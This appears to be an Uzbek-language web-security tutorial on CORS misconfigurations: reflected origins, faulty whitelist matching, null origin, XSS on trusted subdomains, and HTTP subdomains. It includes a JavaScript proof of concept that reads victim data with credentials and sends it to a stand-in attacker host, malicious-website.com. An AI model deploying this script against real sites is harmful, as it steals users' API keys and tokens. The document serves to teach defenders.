**CORS sozlamalaridagi zaifliklardan kelib chiqadigan muammolar**
Ko‘plab zamonaviy veb-saytlar subdomenlar va ishonchli uchinchi tomonlardan kirishga ruxsat berish uchun CORSdan foydalanadi. Ularning CORSni amalga oshirishida xatoliklar bo‘lishi yoki hammasi ishlashi uchun juda bo‘shashgan sozlamalar qo‘llanilishi mumkin, va bu ekspluatatsiya qilinishi mumkin bo‘lgan zaifliklarga olib keladi.

### Mijoz tomonidan yuborilgan `Origin` sarlavhasidan server tomonidan yaratilgan `Access-Control-Allow-Origin` sarlavhasi

Ba’zi ilovalar boshqa bir qancha domenlarga kirishni ta’minlashi kerak. Ruxsat berilgan domenlar ro‘yxatini saqlash doimiy e’tibor talab qiladi va har qanday xato funksionallikni buzish xavfini tug‘diradi. Shuning uchun ba’zi ilovalar oson yo‘lni tanlab, amalda istalgan boshqa domenlardan kirishga ruxsat beradigandek qiladilar.

Buning bir usuli — so‘rovlardan kelgan `Origin` sarlavhasini o‘qib, javobga so‘rov yuborgan origin ruxsat etilganligini ko‘rsatadigan sarlavha qo‘shishdir. Masalan, quyidagi so‘rov yuborilgan deb tasavvur qilaylik:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

Ilova quyidagicha javob beradi:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Ushbu sarlavhalar so‘rov yuborgan domen (malicious-website.com)dan kirish ruxsat etilganini va xoch-manba so‘rovlari cookie’larni o‘z ichiga olishi mumkinligini (`Access-Control-Allow-Credentials: true`) bildiradi, ya’ni ular sessiya kontekstida qayta ishlanadi.

Ilova `Access-Control-Allow-Origin` sarlavhasida ixtiyoriy originni aks ettirgani uchun, bu zaif domenning istalgan domeni undan resurslarni o‘qishi mumkin degani. Agar javobda API kaliti yoki CSRF tokeni kabi maxfiy ma’lumot bo‘lsa, buni o‘zingizning saytingizga quyidagi skriptni joylab olinishingiz mumkin:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

### `Origin` sarlavhasini tahlil qilishdagi xatolar

Bir nechta originlardan kirishni qo‘llab-quvvatlaydigan ba’zi ilovalar ruxsat berilgan originlar oq ro‘yxatini (whitelist) ishlatadi. CORS so‘rovi kelganda, taqdim etilgan origin oq ro‘yxat bilan solishtiriladi. Agar origin ro‘yxatda bo‘lsa, u `Access-Control-Allow-Origin` sarlavhasida aks ettiriladi va kirishga ruxsat beriladi. Masalan, ilova quyidagi oddiy so‘rovni oladi:

```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

Ilova taqdim etilgan originni ruxsat etilgan originlar ro‘yxati bilan tekshiradi va agar ro‘yxatda bo‘lsa, originni quyidagicha aks ettiradi:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

CORS origin oq ro‘yxatlarini amalga oshirishda ko‘pincha xatolar yuzaga keladi. Ba’zi tashkilotlar barcha subdomenlaridan (kelajakdagi hali mavjud bo‘lmagan subdomenlar ham) kirishga ruxsat berishga qaror qilishadi. Ba’zi ilovalar esa turli tashkilotlarga tegishli domenlar va ularning subdomenlaridan kirishga ruxsat beradi. Bu qoidalar ko‘pincha URL prefiks yoki suffiksi bo‘yicha moslash, yoki muntazam ifodalar (regular expressions) yordamida amalga oshiriladi. Implementatsiyadagi har qanday xato kutilmagan tashqi domenlarga ruxsat berilishiga olib kelishi mumkin.

Masalan, tasavvur qilaylik, ilova quyidagi bilan tugaydigan barcha domenlarga ruxsat beradi:

```
normal-website.com
```

Hujumchi quyidagi domenni ro‘yxatdan o‘tkazib, kirish imkoniyatini qo‘lga kiritishi mumkin:

```
hackersnormal-website.com
```

Yana, agar ilova quyidagilar bilan boshlanuvchi barcha domenlarga ruxsat bersa:

```
normal-website.com
```

Hujumchi quyidagi domenni ishlatib kirish imkonini olishi mumkin:

```
normal-website.com.evil-user.net
```

**Null (`null`) origin qiymatining oq roʻyxatga olinishi**
`Origin` sarlavhasi spetsifikatsiyasi `null` qiymatini qoʻllab-quvvatlaydi. Brauzerlar turli gʻayrioddiy holatlarda `Origin` sarlavhasida `null` qiymatini joʻnatishi mumkin:

* Xoch-manbali (cross-origin) yoʻnaltirishlar (redirects).
* Seriyalizatsiyalangan ma’lumotlardan yuborilgan soʻrovlar.
* `file:` protokoli yordamida yuborilgan soʻrovlar.
* Sandboxed (qum qutisidagi) xoch-manbali soʻrovlar.

**CORS ishonch munosabatlari orqali XSS’dan foydalanish**
Hatto “to‘g‘ri” sozlangan CORS ham ikki origin (manba) o‘rtasida ishonch munosabatini o‘rnatadi. Agar bir sayt XSS (cross-site scripting) ga zaif originni ishonchli deb bilsa, hujumchi shu XSS zaifligidan foydalanib JavaScript injektsiya qilishi va CORS orqali uni ishonadigan saytdan maxfiy ma’lumotlarni olish uchun ishlatishi mumkin.

Quyidagi so‘rov berilgan deb faraz qilaylik:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Agar server quyidagicha javob bersa:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Unda `subdomain.vulnerable-website.com` da XSS zaifligini topgan hujumchi ushbu zaiflikni CORS bilan birga ishlatib API kalitni olishi mumkin. Masalan, quyidagi URL orqali:

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

**Yomon sozlangan CORS orqali TLS (HTTPS)ni buzish**
Tasavvur qiling, qat’iy ravishda HTTPS dan foydalanadigan ilova ham ishonchli deb bilgan subdomenni oq ro‘yxatga qo‘ygan, lekin o‘sha subdomen oddiy HTTP (shifrlanmagan)ni ishlatadi. Masalan, ilova quyidagi so‘rovni oladi:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Ilova quyidagicha javob beradi:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Bunday holatda, agar `trusted-subdomain.vulnerable-website.com` HTTPS orqali emas, balki HTTP orqali ishlasa, yomon niyatli tomonlar o‘rtadagi odam (MITM) hujumlari yoki trafikni manipulyatsiya qilish orqali maxfiy ma’lumotlarni o‘zlashtirishi mumkin — ya’ni CORS konfiguratsiyasining noaniqligi TLS/HTTPS himoyasini zaiflashtiradi.

